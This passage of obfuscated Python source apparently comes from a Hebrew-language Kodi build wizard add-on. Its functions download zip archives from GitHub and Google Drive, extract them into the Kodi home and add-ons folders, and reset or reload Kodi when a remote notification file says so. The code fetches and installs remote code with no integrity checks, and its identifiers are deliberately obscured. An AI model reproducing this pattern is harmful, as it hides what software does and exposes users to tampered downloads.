                        wiz .log ("Error on Notifications Window: %s"%str (O00O0O0O00OO000OO ),xbmc .LOGERROR )#line:5860
                else :wiz .log ("[Notifications] Text File not formated Correctly")#line:5861
            else :wiz .log ("[Notifications] URL(%s): %s"%(NOTIFICATION ,OO000O00O0O0OO0O0 ),xbmc .LOGNOTICE )#line:5862
        else :wiz .log ("[Notifications] Turned Off",xbmc .LOGNOTICE )#line:5863
def checkidupdate ():#line:5867
				wiz .setS ("notedismiss","true")#line:5869
				O0OO0O0O00OO0000O =wiz .workingURL (NOTIFICATION )#line:5870
				O00000O0O00OOOO0O =" Kodi Premium"#line:5872
				OOO0O0OO0OOO0O000 =wiz .checkBuild (O00000O0O00OOOO0O ,'gui')#line:5873
				O00O000OOOOO0000O =O00000O0O00OOOO0O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:5874
				if not wiz .workingURL (OOO0O0OO0OOO0O000 )==True :return #line:5875
				if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:5876
				DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון אחרון[/B][/COLOR][COLOR %s][/COLOR]'%(COLOR1 ,O00000O0O00OOOO0O ),'','אנא המתן')#line:5877
				O00OOO00OOOO00OOO =os .path .join (PACKAGES ,'%s_guisettings.zip'%O00O000OOOOO0000O )#line:5878
				try :os .remove (O00OOO00OOOO00OOO )#line:5879
				except :pass #line:5880
				logging .warning (OOO0O0OO0OOO0O000 )#line:5881
				if 'google'in OOO0O0OO0OOO0O000 :#line:5882
				   O0O0OOO0O000000O0 =googledrive_download (OOO0O0OO0OOO0O000 ,O00OOO00OOOO00OOO ,DP ,wiz .checkBuild (O00000O0O00OOOO0O ,'updatesize'))#line:5883
				else :#line:5886
				  downloader .download (OOO0O0OO0OOO0O000 ,O00OOO00OOOO00OOO ,DP )#line:5887
				xbmc .sleep (100 )#line:5888
				O0O0O0O0O00OOOO00 ='עדכון אחרון'#line:5889
				O000O00OOO0O00OO0 ='[COLOR %s][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0O0O0O0O00OOOO00 )#line:5890
				DP .update (0 ,O000O00OOO0O00OO0 ,'','אנא המתן')#line:5891
				extract .all (O00OOO00OOOO00OOO ,HOME ,DP ,title =O000O00OOO0O00OO0 )#line:5892
				DP .close ()#line:5893
				wiz .defaultSkin ()#line:5894
				wiz .lookandFeelData ('save')#line:5895
				if KODIV >=18 :#line:5896
					skindialogsettind18 ()#line:5897
				if INSTALLMETHOD ==1 :OOO00000O0O000O0O =1 #line:5900
				elif INSTALLMETHOD ==2 :OOO00000O0O000O0O =0 #line:5901
				else :DP .close ()#line:5902
def checkidupdatetele ():#line:5903
				wiz .setS ("notedismiss","true")#line:5905
				OOOOOO000OOO000OO =wiz .workingURL (NOTIFICATION )#line:5906
				OOOO0O0O00O00OO00 =" Kodi Premium"#line:5908
				O00OO0O0OO000O000 =wiz .checkBuild (OOOO0O0O00O00OO00 ,'gui')#line:5909
				OOO00000O00O0OO0O =OOOO0O0O00O00OO00 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:5910
				if not wiz .workingURL (O00OO0O0OO000O000 )==True :return #line:5911
				if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:5912
				OOO000OO0OOOO0O00 =os .path .join (PACKAGES ,'%s_guisettings.zip'%OOO00000O00O0OO0O )#line:5915
				try :os .remove (OOO000OO0OOOO0O00 )#line:5916
				except :pass #line:5917
				if 'google'in O00OO0O0OO000O000 :#line:5919
				   OOO0O00O0O0O00O0O =googledrive_download (O00OO0O0OO000O000 ,OOO000OO0OOOO0O00 ,DP2 ,wiz .checkBuild (OOOO0O0O00O00OO00 ,'filesize'))#line:5920
				else :#line:5923
				  downloaderbg .download3 (O00OO0O0OO000O000 ,OOO000OO0OOOO0O00 ,DP2 )#line:5924
				xbmc .sleep (100 )#line:5925
				DP2 .create ('[B][COLOR=green]מתקין                         [/COLOR][/B]')#line:5926
				DP2 .update (100 ,message ='[B][COLOR=yellow]אנא המתן ...                    [/COLOR][/B]')#line:5928
				extract .all2 (OOO000OO0OOOO0O00 ,HOME ,DP2 )#line:5930
				DP2 .close ()#line:5931
				wiz .defaultSkin ()#line:5932
				wiz .lookandFeelData ('save')#line:5933
				wiz .kodi17Fix ()#line:5934
				if KODIV >=18 :#line:5935
					skindialogsettind18 ()#line:5936
				debridit .debridIt ('restore','all')#line:5941
				traktit .traktIt ('restore','all')#line:5942
				if INSTALLMETHOD ==1 :OOO00O00O0OOOOO0O =1 #line:5943
				elif INSTALLMETHOD ==2 :OOO00O00O0OOOOO0O =0 #line:5944
				else :DP2 .close ()#line:5945
				O0O0O0OOOO000O0O0 =(NOTIFICATION2 )#line:5946
				O00000O0OO0OO0O0O =urllib2 .urlopen (O0O0O0OOOO000O0O0 )#line:5947
				OOOO000O0O0OOOOOO =O00000O0OO0OO0O0O .readlines ()#line:5948
				O0OOO0O0OOOO00OOO =0 #line:5949
				for O0O0OOOOO0O000000 in OOOO000O0O0OOOOOO :#line:5952
					if O0O0OOOOO0O000000 .split (' ==')[0 ]=="noreset"or O0O0OOOOO0O000000 .split ()[0 ]=="noreset":#line:5953
						xbmc .executebuiltin ("ReloadSkin()")#line:5955
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הבילד עודכן בהצלחה![/COLOR]'%COLOR2 )#line:5956
						OOO0OO0O00000OOOO =(ADDON .getSetting ("message"))#line:5957
						if OOO0OO0O00000OOOO =='true':#line:5958
							infobuild ()#line:5959
						update_Votes ()#line:5960
						indicatorfastupdate ()#line:5961
					if O0O0OOOOO0O000000 .split (' ==')[0 ]=="reset"or O0O0OOOOO0O000000 .split ()[0 ]=="reset":#line:5962
						update_Votes ()#line:5964
						indicatorfastupdate ()#line:5965
						resetkodi ()#line:5966
def gaiaserenaddon ():#line:5967
  OOO0OO0OO00OOO000 =(ADDON .getSetting ("gaiaseren"))#line:5968
  O0OO000000OO0OO00 =(ADDON .getSetting ("auto_rd"))#line:5969
  if OOO0OO0OO00OOO000 =='true'and O0OO000000OO0OO00 =='true':#line:5970
    OOOOOO0000O00O0O0 =(NEWFASTUPDATE )#line:5971
    O00OOO0OOOO0O0OO0 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5972
    O0000OOO0OOOOO00O =xbmcgui .DialogProgress ()#line:5973
    O0000OOO0OOOOO00O .create ("[B][COLOR=green]מתקין את ההרחבה גאיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:5974
    OO0O0O00O000O0O00 =os .path .join (PACKAGES ,'isr.zip')#line:5975
    OOO00O0O0OOO00OOO =urllib2 .Request (OOOOOO0000O00O0O0 )#line:5976
    OO00OO0O00O00O00O =urllib2 .urlopen (OOO00O0O0OOO00OOO )#line:5977
    OO0OOO0OOOOO0O000 =xbmcgui .DialogProgress ()#line:5979
    OO0OOO0OOOOO0O000 .create ("[B][COLOR=green]מתקין את ההרחבה גאיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:5980
    OO0OOO0OOOOO0O000 .update (0 )#line:5981
    O00000OO0O000OOO0 =open (OO0O0O00O000O0O00 ,'wb')#line:5983
    try :#line:5985
      OO0OO000OO0OOO0OO =OO00OO0O00O00O00O .info ().getheader ('Content-Length').strip ()#line:5986
      OOO0O000O0OO0O00O =True #line:5987
    except AttributeError :#line:5988
          OOO0O000O0OO0O00O =False #line:5989
    if OOO0O000O0OO0O00O :#line:5991
          OO0OO000OO0OOO0OO =int (OO0OO000OO0OOO0OO )#line:5992
    O0O0OO00O000O0O0O =0 #line:5994
    O0OO0000OOOO0OO00 =time .time ()#line:5995
    while True :#line:5996
          OOOOO00O00O00OO0O =OO00OO0O00O00O00O .read (8192 )#line:5997
          if not OOOOO00O00O00OO0O :#line:5998
              sys .stdout .write ('\n')#line:5999
              break #line:6000
          O0O0OO00O000O0O0O +=len (OOOOO00O00O00OO0O )#line:6002
          O00000OO0O000OOO0 .write (OOOOO00O00O00OO0O )#line:6003
          if not OOO0O000O0OO0O00O :#line:6005
              OO0OO000OO0OOO0OO =O0O0OO00O000O0O0O #line:6006
          if OO0OOO0OOOOO0O000 .iscanceled ():#line:6007
             OO0OOO0OOOOO0O000 .close ()#line:6008
             try :#line:6009
              os .remove (OO0O0O00O000O0O00 )#line:6010
             except :#line:6011
              pass #line:6012
             break #line:6013
          OOO0OOOOOOOOOOOOO =float (O0O0OO00O000O0O0O )/OO0OO000OO0OOO0OO #line:6014
          OOO0OOOOOOOOOOOOO =round (OOO0OOOOOOOOOOOOO *100 ,2 )#line:6015
          O0OOOO0O0O0O000O0 =O0O0OO00O000O0O0O /(1024 *1024 )#line:6016
          OO00O000O000O00OO =OO0OO000OO0OOO0OO /(1024 *1024 )#line:6017
          OOO0OOO00O0OOO00O ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O0OOOO0O0O0O000O0 ,'teal',OO00O000O000O00OO )#line:6018
          if (time .time ()-O0OO0000OOOO0OO00 )>0 :#line:6019
            O00000OO00OO00O00 =O0O0OO00O000O0O0O /(time .time ()-O0OO0000OOOO0OO00 )#line:6020
            O00000OO00OO00O00 =O00000OO00OO00O00 /1024 #line:6021
          else :#line:6022
           O00000OO00OO00O00 =0 #line:6023
          O00OOOO0O00O0OOOO ='KB'#line:6024
          if O00000OO00OO00O00 >=1024 :#line:6025
             O00000OO00OO00O00 =O00000OO00OO00O00 /1024 #line:6026
             O00OOOO0O00O0OOOO ='MB'#line:6027
          if O00000OO00OO00O00 >0 and not OOO0OOOOOOOOOOOOO ==100 :#line:6028
              OOO0O0000OO000O0O =(OO0OO000OO0OOO0OO -O0O0OO00O000O0O0O )/O00000OO00OO00O00 #line:6029
          else :#line:6030
              OOO0O0000OO000O0O =0 #line:6031
          OO000O0O0OOOO00OO ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O00000OO00OO00O00 ,O00OOOO0O00O0OOOO )#line:6032
          OO0OOO0OOOOO0O000 .update (int (OOO0OOOOOOOOOOOOO ),OOO0OOO00O0OOO00O ,OO000O0O0OOOO00OO +"[B][COLOR=silver]מוריד.... [/COLOR][/B]")#line:6034
    OO0O00O0OOO000O00 =xbmc .translatePath (os .path .join ('special://home/addons'))#line:6037
    O00000OO0O000OOO0 .close ()#line:6040
    extract .all (OO0O0O00O000O0O00 ,OO0O00O0OOO000O00 ,OO0OOO0OOOOO0O000 )#line:6041
    try :#line:6045
      os .remove (OO0O0O00O000O0O00 )#line:6046
    except :#line:6047
      pass #line:6048
def iptvsimpldownpc ():#line:6049
    OOO0OOOOOOOO00OOO =(IPTVSIMPL18PC )#line:6051
    OO0OO00O0O0000000 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:6052
    O0O0O00OOOO000000 =xbmcgui .DialogProgress ()#line:6053
    O0O0O00OOOO000000 .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:6054
    OO0O0OOOOO0OO0O0O =os .path .join (PACKAGES ,'isr.zip')#line:6055
    O0OOOO00OOOO000O0 =urllib2 .Request (OOO0OOOOOOOO00OOO )#line:6056
    O0O000OOOOOO00000 =urllib2 .urlopen (O0OOOO00OOOO000O0 )#line:6057
    OOO00O00OO0O00000 =xbmcgui .DialogProgress ()#line:6059
    OOO00O00OO0O00000 .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:6060
    OOO00O00OO0O00000 .update (0 )#line:6061
    O0OO0O000O00000OO =open (OO0O0OOOOO0OO0O0O ,'wb')#line:6063
    try :#line:6065
      OOOO00OOOOO00OO00 =O0O000OOOOOO00000 .info ().getheader ('Content-Length').strip ()#line:6066
      O0OO00O0OOO0OO000 =True #line:6067
    except AttributeError :#line:6068
          O0OO00O0OOO0OO000 =False #line:6069
    if O0OO00O0OOO0OO000 :#line:6071
          OOOO00OOOOO00OO00 =int (OOOO00OOOOO00OO00 )#line:6072
    OO00OO0OO0000OO00 =0 #line:6074
    O0OO0OO0OO00OOOO0 =time .time ()#line:6075
    while True :#line:6076
          OOO000OO0OO00000O =O0O000OOOOOO00000 .read (8192 )#line:6077
          if not OOO000OO0OO00000O :#line:6078
              sys .stdout .write ('\n')#line:6079
              break #line:6080
          OO00OO0OO0000OO00 +=len (OOO000OO0OO00000O )#line:6082
          O0OO0O000O00000OO .write (OOO000OO0OO00000O )#line:6083
          if not O0OO00O0OOO0OO000 :#line:6085
              OOOO00OOOOO00OO00 =OO00OO0OO0000OO00 #line:6086
          if OOO00O00OO0O00000 .iscanceled ():#line:6087
             OOO00O00OO0O00000 .close ()#line:6088
             try :#line:6089
              os .remove (OO0O0OOOOO0OO0O0O )#line:6090
             except :#line:6091
              pass #line:6092
             break #line:6093
          OOO00O0OOOO00O0OO =float (OO00OO0OO0000OO00 )/OOOO00OOOOO00OO00 #line:6094
          OOO00O0OOOO00O0OO =round (OOO00O0OOOO00O0OO *100 ,2 )#line:6095
          OOOOO00O00OOO0000 =OO00OO0OO0000OO00 /(1024 *1024 )#line:6096
          OO0O00O0OO0O0O00O =OOOO00OOOOO00OO00 /(1024 *1024 )#line:6097
          O0O0O0OO0000OO000 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OOOOO00O00OOO0000 ,'teal',OO0O00O0OO0O0O00O )#line:6098
          if (time .time ()-O0OO0OO0OO00OOOO0 )>0 :#line:6099
            OO0O00O00O0OOO000 =OO00OO0OO0000OO00 /(time .time ()-O0OO0OO0OO00OOOO0 )#line:6100
            OO0O00O00O0OOO000 =OO0O00O00O0OOO000 /1024 #line:6101
          else :#line:6102
           OO0O00O00O0OOO000 =0 #line:6103
          OOO00OO0O00OOOOO0 ='KB'#line:6104
          if OO0O00O00O0OOO000 >=1024 :#line:6105
             OO0O00O00O0OOO000 =OO0O00O00O0OOO000 /1024 #line:6106
             OOO00OO0O00OOOOO0 ='MB'#line:6107
          if OO0O00O00O0OOO000 >0 and not OOO00O0OOOO00O0OO ==100 :#line:6108
              OO000O0OO0OOOOOO0 =(OOOO00OOOOO00OO00 -OO00OO0OO0000OO00 )/OO0O00O00O0OOO000 #line:6109
          else :#line:6110
              OO000O0OO0OOOOOO0 =0 #line:6111
          OO0O00OO00O00OOO0 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OO0O00O00O0OOO000 ,OOO00OO0O00OOOOO0 )#line:6112
          OOO00O00OO0O00000 .update (int (OOO00O0OOOO00O0OO ),O0O0O0OO0000OO000 ,OO0O00OO00O00OOO0 +"[B][COLOR=silver]מוריד.... [/COLOR][/B]")#line:6114
    OO0OOOOOOOOO0000O =xbmc .translatePath (os .path .join ('special://home/addons'))#line:6117
    O0OO0O000O00000OO .close ()#line:6120
    extract .all (OO0O0OOOOO0OO0O0O ,OO0OOOOOOOOO0000O ,OOO00O00OO0O00000 )#line:6121
    try :#line:6125
      os .remove (OO0O0OOOOO0OO0O0O )#line:6126
    except :#line:6127
      pass #line:6128
def iptvkodi18idan ():#line:6129
      if xbmc .getCondVisibility ('system.platform.windows')and KODIV >=18 :#line:6131
              O00O0O00OOO0O00O0 ='https://github.com/vip200/victory/blob/master/pvr.iptvsimple18win.zip?raw=true'#line:6134
              OOOO00OOOOOO00000 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:6135
              O0O0O0OOO0OO000OO =xbmcgui .DialogProgress ()#line:6136
              O0O0O0OOO0OO000OO .create ("XBMC ISRAEL","Downloading "+'הגדרת ערוצי עידן פלוס','','Please Wait')#line:6137
              O0O0OOOOO0OO00OOO =os .path .join (OOOO00OOOOOO00000 ,'isr.zip')#line:6138
              O0OO0O00OO000O0OO =urllib2 .Request (O00O0O00OOO0O00O0 )#line:6139
              OO0000OOOOOO0O000 =urllib2 .urlopen (O0OO0O00OO000O0OO )#line:6140
              O00O0O00O0OO0OO00 =xbmcgui .DialogProgress ()#line:6142
              O00O0O00O0OO0OO00 .create ("Downloading","Downloading "+'הגדרת ערוצי עידן פלוס')#line:6143
              O00O0O00O0OO0OO00 .update (0 )#line:6144
              OO000000O000OO0O0 =open (O0O0OOOOO0OO00OOO ,'wb')#line:6146
              try :#line:6148
                O0O0O0OO000OO0O00 =OO0000OOOOOO0O000 .info ().getheader ('Content-Length').strip ()#line:6149
                OO00O0O0OO000000O =True #line:6150
              except AttributeError :#line:6151
                    OO00O0O0OO000000O =False #line:6152
              if OO00O0O0OO000000O :#line:6154
                    O0O0O0OO000OO0O00 =int (O0O0O0OO000OO0O00 )#line:6155
              O0OOO0000000OOO00 =0 #line:6157
              O00OOOO0O0000O0OO =time .time ()#line:6158
              while True :#line:6159
                    O0O00OO00OO0000O0 =OO0000OOOOOO0O000 .read (8192 )#line:6160
                    if not O0O00OO00OO0000O0 :#line:6161
                        sys .stdout .write ('\n')#line:6162
                        break #line:6163
                    O0OOO0000000OOO00 +=len (O0O00OO00OO0000O0 )#line:6165
                    OO000000O000OO0O0 .write (O0O00OO00OO0000O0 )#line:6166
                    if not OO00O0O0OO000000O :#line:6168
                        O0O0O0OO000OO0O00 =O0OOO0000000OOO00 #line:6169
                    if O00O0O00O0OO0OO00 .iscanceled ():#line:6170
                       O00O0O00O0OO0OO00 .close ()#line:6171
                       try :#line:6172
                        os .remove (O0O0OOOOO0OO00OOO )#line:6173
                       except :#line:6174
                        pass #line:6175
                       break #line:6176
                    OO0OO00OOOO000O00 =float (O0OOO0000000OOO00 )/O0O0O0OO000OO0O00 #line:6177
                    OO0OO00OOOO000O00 =round (OO0OO00OOOO000O00 *100 ,2 )#line:6178
                    OOO0OO00OO0OO0O0O =O0OOO0000000OOO00 /(1024 *1024 )#line:6179
                    OO000O00OOOOO00O0 =O0O0O0OO000OO0O00 /(1024 *1024 )#line:6180
                    O00OOO0000OOO0OO0 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OOO0OO00OO0OO0O0O ,'teal',OO000O00OOOOO00O0 )#line:6181
                    if (time .time ()-O00OOOO0O0000O0OO )>0 :#line:6182
                      OOO00O0OO0OO0O000 =O0OOO0000000OOO00 /(time .time ()-O00OOOO0O0000O0OO )#line:6183
                      OOO00O0OO0OO0O000 =OOO00O0OO0OO0O000 /1024 #line:6184
                    else :#line:6185
                     OOO00O0OO0OO0O000 =0 #line:6186
                    OOO0OO0000O0OOO0O ='KB'#line:6187
                    if OOO00O0OO0OO0O000 >=1024 :#line:6188
                       OOO00O0OO0OO0O000 =OOO00O0OO0OO0O000 /1024 #line:6189
                       OOO0OO0000O0OOO0O ='MB'#line:6190
                    if OOO00O0OO0OO0O000 >0 and not OO0OO00OOOO000O00 ==100 :#line:6191
                        O0O00000OO0O0O00O =(O0O0O0OO000OO0O00 -O0OOO0000000OOO00 )/OOO00O0OO0OO0O000 #line:6192
                    else :#line:6193
                        O0O00000OO0O0O00O =0 #line:6194
                    O0OOO0OO0OOOOOOO0 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OOO00O0OO0OO0O000 ,OOO0OO0000O0OOO0O )#line:6195
                    O00O0O00O0OO0OO00 .update (int (OO0OO00OOOO000O00 ),"Downloading "+'iptv',O00OOO0000OOO0OO0 ,O0OOO0OO0OOOOOOO0 )#line:6197
              O0OOOOO00OO00OOO0 =xbmc .translatePath (os .path .join ('special://home/addons'))#line:6200
              OO000000O000OO0O0 .close ()#line:6203
              extract .all (O0O0OOOOO0OO00OOO ,O0OOOOO00OO00OOO0 ,O00O0O00O0OO0OO00 )#line:6204
              try :#line:6207
                os .remove (O0O0OOOOO0OO00OOO )#line:6208
              except :#line:6210
                pass #line:6211
              O00O0O00O0OO0OO00 .close ()#line:6212
      if xbmc .getCondVisibility ('system.platform.android')and KODIV >=18 :#line:6215
              O00O0O00OOO0O00O0 ='https://github.com/vip200/victory/blob/master/pvr.iptvsimple18android.zip?raw=true'#line:6217
              OOOO00OOOOOO00000 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:6218
              O0O0O0OOO0OO000OO =xbmcgui .DialogProgress ()#line:6219
              O0O0O0OOO0OO000OO .create ("XBMC ISRAEL","Downloading "+'הגדרת ערוצי עידן פלוס','','Please Wait')#line:6220
              O0O0OOOOO0OO00OOO =os .path .join (OOOO00OOOOOO00000 ,'isr.zip')#line:6221
              O0OO0O00OO000O0OO =urllib2 .Request (O00O0O00OOO0O00O0 )#line:6222
              OO0000OOOOOO0O000 =urllib2 .urlopen (O0OO0O00OO000O0OO )#line:6223
              O00O0O00O0OO0OO00 =xbmcgui .DialogProgress ()#line:6225
              O00O0O00O0OO0OO00 .create ("Downloading","Downloading "+'הגדרת ערוצי עידן פלוס')#line:6226
              O00O0O00O0OO0OO00 .update (0 )#line:6227
              OO000000O000OO0O0 =open (O0O0OOOOO0OO00OOO ,'wb')#line:6229
              try :#line:6231
                O0O0O0OO000OO0O00 =OO0000OOOOOO0O000 .info ().getheader ('Content-Length').strip ()#line:6232
                OO00O0O0OO000000O =True #line:6233
              except AttributeError :#line:6234
                    OO00O0O0OO000000O =False #line:6235
              if OO00O0O0OO000000O :#line:6237
                    O0O0O0OO000OO0O00 =int (O0O0O0OO000OO0O00 )#line:6238
              O0OOO0000000OOO00 =0 #line:6240
              O00OOOO0O0000O0OO =time .time ()#line:6241
              while True :#line:6242
                    O0O00OO00OO0000O0 =OO0000OOOOOO0O000 .read (8192 )#line:6243
                    if not O0O00OO00OO0000O0 :#line:6244
                        sys .stdout .write ('\n')#line:6245
                        break #line:6246
                    O0OOO0000000OOO00 +=len (O0O00OO00OO0000O0 )#line:6248
                    OO000000O000OO0O0 .write (O0O00OO00OO0000O0 )#line:6249
                    if not OO00O0O0OO000000O :#line:6251
                        O0O0O0OO000OO0O00 =O0OOO0000000OOO00 #line:6252
                    if O00O0O00O0OO0OO00 .iscanceled ():#line:6253
                       O00O0O00O0OO0OO00 .close ()#line:6254
                       try :#line:6255
                        os .remove (O0O0OOOOO0OO00OOO )#line:6256
                       except :#line:6257
                        pass #line:6258
                       break #line:6259
                    OO0OO00OOOO000O00 =float (O0OOO0000000OOO00 )/O0O0O0OO000OO0O00 #line:6260
                    OO0OO00OOOO000O00 =round (OO0OO00OOOO000O00 *100 ,2 )#line:6261
                    OOO0OO00OO0OO0O0O =O0OOO0000000OOO00 /(1024 *1024 )#line:6262
                    OO000O00OOOOO00O0 =O0O0O0OO000OO0O00 /(1024 *1024 )#line:6263
                    O00OOO0000OOO0OO0 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OOO0OO00OO0OO0O0O ,'teal',OO000O00OOOOO00O0 )#line:6264
                    if (time .time ()-O00OOOO0O0000O0OO )>0 :#line:6265
                      OOO00O0OO0OO0O000 =O0OOO0000000OOO00 /(time .time ()-O00OOOO0O0000O0OO )#line:6266
                      OOO00O0OO0OO0O000 =OOO00O0OO0OO0O000 /1024 #line:6267
                    else :#line:6268
                     OOO00O0OO0OO0O000 =0 #line:6269
                    OOO0OO0000O0OOO0O ='KB'#line:6270
                    if OOO00O0OO0OO0O000 >=1024 :#line:6271
                       OOO00O0OO0OO0O000 =OOO00O0OO0OO0O000 /1024 #line:6272
                       OOO0OO0000O0OOO0O ='MB'#line:6273
                    if OOO00O0OO0OO0O000 >0 and not OO0OO00OOOO000O00 ==100 :#line:6274
                        O0O00000OO0O0O00O =(O0O0O0OO000OO0O00 -O0OOO0000000OOO00 )/OOO00O0OO0OO0O000 #line:6275
                    else :#line:6276
                        O0O00000OO0O0O00O =0 #line:6277
                    O0OOO0OO0OOOOOOO0 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OOO00O0OO0OO0O000 ,OOO0OO0000O0OOO0O )#line:6278
                    O00O0O00O0OO0OO00 .update (int (OO0OO00OOOO000O00 ),"Downloading "+'iptv',O00OOO0000OOO0OO0 ,O0OOO0OO0OOOOOOO0 )#line:6280
              O0OOOOO00OO00OOO0 =xbmc .translatePath (os .path .join ('special://home/addons'))#line:6283
              OO000000O000OO0O0 .close ()#line:6286
              extract .all (O0O0OOOOO0OO00OOO ,O0OOOOO00OO00OOO0 ,O00O0O00O0OO0OO00 )#line:6287
              try :#line:6288
                os .remove (O0O0OOOOO0OO00OOO )#line:6289
              except :#line:6291
                pass #line:6292
              O00O0O00O0OO0OO00 .close ()#line:6293
def iptvkodi17_18 ():#line:6294
      if xbmc .getCondVisibility ('system.platform.windows')and KODIV >=17 and KODIV <18 :#line:6297
        xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Addons.SetAddonEnabled","params":{"addonid":"pvr.iptvsimple","enabled":true},"id":1}')#line:6298
        xbmc .executebuiltin ('Addon.OpenSettings(%s)'%'pvr.iptvsimple')#line:6299
      if xbmc .getCondVisibility ('system.platform.windows')and KODIV >=18 :#line:6303
          if not os .path .exists (os .path .join (ADDONS ,'pvr.iptvsimple')):#line:6304
              O00OO00000O00O000 ='https://github.com/vip200/victory/blob/master/pvr.iptvsimple18win.zip?raw=true'#line:6306
              OO00OO0O0OOOO000O =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:6307
              OO00OO0O0OOO0O000 =xbmcgui .DialogProgress ()#line:6308
              OO00OO0O0OOO0O000 .create ("XBMC ISRAEL","Downloading "+'iptv','','Please Wait')#line:6309
              OO00O0000O000O000 =os .path .join (OO00OO0O0OOOO000O ,'isr.zip')#line:6310
              O000O0OO0OOOOO0O0 =urllib2 .Request (O00OO00000O00O000 )#line:6311
              OOOO0O00OO000O0OO =urllib2 .urlopen (O000O0OO0OOOOO0O0 )#line:6312
              O0O00OOOO00000O00 =xbmcgui .DialogProgress ()#line:6314
              O0O00OOOO00000O00 .create ("Downloading","Downloading "+'iptv')#line:6315
              O0O00OOOO00000O00 .update (0 )#line:6316
              O0OO00000OOOO0OOO =open (OO00O0000O000O000 ,'wb')#line:6318
              try :#line:6320
                OOOO00OOOO0OO000O =OOOO0O00OO000O0OO .info ().getheader ('Content-Length').strip ()#line:6321
                O0O0OO0O000000O00 =True #line:6322
              except AttributeError :#line:6323
                    O0O0OO0O000000O00 =False #line:6324
              if O0O0OO0O000000O00 :#line:6326
                    OOOO00OOOO0OO000O =int (OOOO00OOOO0OO000O )#line:6327
              O00O0O0000OOOO000 =0 #line:6329
              OOO0O0O00OO000OOO =time .time ()#line:6330
              while True :#line:6331
                    O00000OOOO0OOO000 =OOOO0O00OO000O0OO .read (8192 )#line:6332
                    if not O00000OOOO0OOO000 :#line:6333
                        sys .stdout .write ('\n')#line:6334
                        break #line:6335
                    O00O0O0000OOOO000 +=len (O00000OOOO0OOO000 )#line:6337
                    O0OO00000OOOO0OOO .write (O00000OOOO0OOO000 )#line:6338
                    if not O0O0OO0O000000O00 :#line:6340
                        OOOO00OOOO0OO000O =O00O0O0000OOOO000 #line:6341
                    if O0O00OOOO00000O00 .iscanceled ():#line:6342
                       O0O00OOOO00000O00 .close ()#line:6343
                       try :#line:6344
                        os .remove (OO00O0000O000O000 )#line:6345
                       except :#line:6346
                        pass #line:6347
                       break #line:6348
                    OO0O00OOO0O0O0O0O =float (O00O0O0000OOOO000 )/OOOO00OOOO0OO000O #line:6349
                    OO0O00OOO0O0O0O0O =round (OO0O00OOO0O0O0O0O *100 ,2 )#line:6350
                    O0OO00OO000O0O0OO =O00O0O0000OOOO000 /(1024 *1024 )#line:6351
                    O000OOO0OOOOO00O0 =OOOO00OOOO0OO000O /(1024 *1024 )#line:6352
                    O000OO0O00000OO0O ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O0OO00OO000O0O0OO ,'teal',O000OOO0OOOOO00O0 )#line:6353
                    if (time .time ()-OOO0O0O00OO000OOO )>0 :#line:6354
                      OOO00OO00OO0OOO0O =O00O0O0000OOOO000 /(time .time ()-OOO0O0O00OO000OOO )#line:6355
                      OOO00OO00OO0OOO0O =OOO00OO00OO0OOO0O /1024 #line:6356
                    else :#line:6357
                     OOO00OO00OO0OOO0O =0 #line:6358
                    OOO00O000O0OO00O0 ='KB'#line:6359
                    if OOO00OO00OO0OOO0O >=1024 :#line:6360
                       OOO00OO00OO0OOO0O =OOO00OO00OO0OOO0O /1024 #line:6361
                       OOO00O000O0OO00O0 ='MB'#line:6362
                    if OOO00OO00OO0OOO0O >0 and not OO0O00OOO0O0O0O0O ==100 :#line:6363
                        OOOO0OO0OO00OO00O =(OOOO00OOOO0OO000O -O00O0O0000OOOO000 )/OOO00OO00OO0OOO0O #line:6364
                    else :#line:6365
                        OOOO0OO0OO00OO00O =0 #line:6366
                    OOOO00O0000OO0O0O ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OOO00OO00OO0OOO0O ,OOO00O000O0OO00O0 )#line:6367
